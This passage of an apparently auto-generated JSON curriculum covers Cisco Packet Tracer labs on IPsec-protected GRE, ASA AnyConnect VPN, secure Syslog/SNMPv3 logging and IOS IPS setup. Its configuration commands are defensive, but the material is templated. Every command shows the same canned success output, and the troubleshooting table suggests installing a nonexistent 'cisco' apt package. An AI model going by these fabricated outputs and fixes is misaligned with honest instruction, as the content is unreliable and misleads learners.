            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "hash sha256",
            "description": "Execute hash command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "authentication pre-share",
            "description": "Execute authentication command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "group 14",
            "description": "Execute group command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "crypto isakmp key TunnelSecretKey2026 address 203.0.113.2",
            "description": "Execute crypto command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "crypto ipsec transform-set TS_ESP esp-aes esp-sha256-hmac",
            "description": "Execute crypto command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "mode transport",
            "description": "Execute mode command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "crypto map IPSEC_MAP 10 ipsec-isakmp",
            "description": "Execute crypto command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "set peer 203.0.113.2",
            "description": "Execute set command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "set transform-set TS_ESP",
            "description": "Execute set command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "match address GRE_TRAFFIC",
            "description": "Execute match command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet0/0",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "crypto map IPSEC_MAP",
            "description": "Execute crypto command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          },
          {
            "shell": "cisco",
            "cmd": "show crypto session",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames."
          }
        ],
        "verification": "Crypto session status shows ACTIVE with AES-256 encryption encrypting GRE frames.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer (Branch Routers)",
          "Cisco Packet Tracer",
          "Crypto session status shows ACTIVE with ...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the difference between IPsec Tunnel mode and Transport mode when securing GRE?",
        "hint": "Transport mode preserves GRE header and encrypts payload, avoiding double IP encapsulation."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of IPsec Tunnel Protection (Phase 2)?",
      "options": [
        "Apply high-grade encryption layers over virtual routes to secure company traffic.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Apply high-grade encryption layers over virtual routes to secure company traffic."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 28.",
    "eli5Story": {
      "title": "The Armored Guard Escort for the Secret Pipe (IPsec Encryption)",
      "analogy": "Cardboard pipes can be peeked into! IPsec wraps that pipe in titanium armor and scrambles all the letters inside into secret code."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 28",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer (Branch Routers)"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 29,
    "week": 15,
    "classNumber": 29,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 15: Remote Access & Infrastructure Monitoring",
    "title": "Remote Access VPNs on Cisco ASA",
    "category": "VPN & Tunnels",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Support secure external remote access architecture connections for remote workers.",
    "tools": [
      "Cisco Packet Tracer",
      "Cisco AnyConnect",
      "ASA"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 1 ASA, 1 ISP, 1 Remote PC",
    "topology": {
      "description": "Lab topology for Remote Access VPNs on Cisco ASA",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "VPN & Tunnels",
        "explanation": "Support secure external remote access architecture connections for remote workers."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Remote Access VPNs on Cisco ASA",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 ASA, 1 ISP, 1 Remote PC.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Remote Access VPNs on Cisco ASA",
        "description": "Build a remote client access profile on the Cisco ASA firewall. Define an address assignment pool, compile group policy profiles, and declare local database credentials. Use the AnyConnect simulator tool on an external laptop node to successfully authenticate and tunnel into private resources.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "ip local pool VPN_POOL 192.168.100.1-192.168.100.50 mask 255.255.255.0",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "group-policy CLIENT_POLICY internal",
            "description": "Execute group-policy command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "group-policy CLIENT_POLICY attributes",
            "description": "Execute group-policy command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "vpn-tunnel-protocol ssl-client",
            "description": "Execute vpn-tunnel-protocol command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "tunnel-group REMOTE_ACCESS type remote-access",
            "description": "Execute tunnel-group command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "tunnel-group REMOTE_ACCESS general-attributes",
            "description": "Execute tunnel-group command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "address-pool VPN_POOL",
            "description": "Execute address-pool command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "default-group-policy CLIENT_POLICY",
            "description": "Execute default-group-policy command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "username remoteuser password RemotePass2026",
            "description": "Execute username command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "webvpn",
            "description": "Execute webvpn command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "enable outside",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "anyconnect enable",
            "description": "Execute anyconnect command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1."
          }
        ],
        "verification": "Remote PC connects via AnyConnect simulator and receives virtual IP 192.168.100.1.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 ASA, 1 ISP, 1 Remote PC",
          "Cisco Packet Tracer",
          "Remote PC connects via AnyConnect simula...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "How does split-tunneling impact corporate network security during remote access?",
        "hint": "It allows users to browse direct internet uninspected, risking malware bridging into corporate LAN."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Remote Access VPNs on Cisco ASA?",
      "options": [
        "Support secure external remote access architecture connections for remote workers.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Support secure external remote access architecture connections for remote workers."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 29.",
    "eli5Story": {
      "title": "The Magic Teleport Gate for Homeworkers (AnyConnect Remote VPN)",
      "analogy": "When an employee works from home in their pajamas, AnyConnect puts an invisible bubble around their laptop so it acts like it is sitting right inside headquarters!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 29",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 ASA, 1 ISP, 1 Remote PC"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 30,
    "week": 15,
    "classNumber": 30,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 15: Remote Access & Infrastructure Monitoring",
    "title": "Securing Management Logging (Syslog & SNMPv3)",
    "category": "Monitoring",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Configure monitoring options to ensure forensic collection transparency without cleartext risks.",
    "tools": [
      "Cisco Packet Tracer",
      "Syslog",
      "SNMPv3"
    ],
    "targetEnvironment": "Cisco Packet Tracer: Router, Syslog, SNMP Station",
    "topology": {
      "description": "Lab topology for Securing Management Logging (Syslog & SNMPv3)",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Monitoring",
        "explanation": "Configure monitoring options to ensure forensic collection transparency without cleartext risks."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Securing Management Logging (Syslog & SNMPv3)",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: Router, Syslog, SNMP Station.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Securing Management Logging (Syslog & SNMPv3)",
        "description": "Program an enterprise router to dispatch system notification logs to a centralized Syslog engine host. Configure an SNMPv3 service engine on the router, enforcing high-level security verification requirements (priv authentication with encryption models). Verify that trap event tracking data is safely parsed by the receiver.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "logging host 192.168.1.200",
            "description": "Execute logging command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "logging trap informational",
            "description": "Execute logging command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "logging source-interface GigabitEthernet0/0",
            "description": "Execute logging command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "snmp-server group SECURE_GRP v3 priv",
            "description": "Execute snmp-server command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "snmp-server user secadmin SECURE_GRP v3 auth sha AuthPass2026 priv aes 128 PrivPass2026",
            "description": "Execute snmp-server command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "snmp-server host 192.168.1.201 version 3 priv secadmin",
            "description": "Execute snmp-server command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "show logging",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          },
          {
            "shell": "cisco",
            "cmd": "show snmp user",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption."
          }
        ],
        "verification": "Router logs stream to Syslog dashboard; SNMPv3 queries require SHA auth and AES decryption.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: Router, Syslog, SNMP Station",
          "Cisco Packet Tracer",
          "Router logs stream to Syslog dashboard; ...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is SNMPv1/v2c dangerous in modern enterprise environments?",
        "hint": "SNMPv1/v2c uses cleartext 'community strings' vulnerable to sniffing and unauthorized reconfiguration."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Securing Management Logging (Syslog & SNMPv3)?",
      "options": [
        "Configure monitoring options to ensure forensic collection transparency without cleartext risks.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Configure monitoring options to ensure forensic collection transparency without cleartext risks."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 30.",
    "eli5Story": {
      "title": "The Unbreakable Black Box Flight Recorder (Syslog & SNMPv3)",
      "analogy": "Whenever anything moves, an airplane records it in a flame-proof black box. Syslog sends all events to a safe server so nobody can erase their tracks."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 30",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: Router, Syslog, SNMP Station"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 31,
    "week": 16,
    "classNumber": 31,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 16: Advanced Threat Mitigation Capstone",
    "title": "Configuring Cisco Router IOS IPS",
    "category": "Threat Mitigation",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Enable active inline pattern tracking options to drop attacks at the perimeter interface.",
    "tools": [
      "Cisco Packet Tracer",
      "IOS IPS",
      "Security Signatures"
    ],
    "targetEnvironment": "Cisco Packet Tracer: Border Router, PC, Attacker",
    "topology": {
      "description": "Lab topology for Configuring Cisco Router IOS IPS",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Threat Mitigation",
        "explanation": "Enable active inline pattern tracking options to drop attacks at the perimeter interface."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Configuring Cisco Router IOS IPS",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: Border Router, PC, Attacker.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Configuring Cisco Router IOS IPS",
        "description": "Build a dedicated IPS storage workspace directory within a router's flash file framework. Import signature verification crypto keys, activate the core IOS IPS defense engine framework, and assign active tracking profiles to the external interface to block known attack strings.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "mkdir flash:ipsdir",
            "description": "Execute mkdir command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "ip ips config location flash:ipsdir",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "ip ips name MY_IPS",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "ip ips signature-category",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "category ios_ips basic",
            "description": "Execute category command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "retired false",
            "description": "Execute retired command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet0/1",
            "description": "Execute interface command",
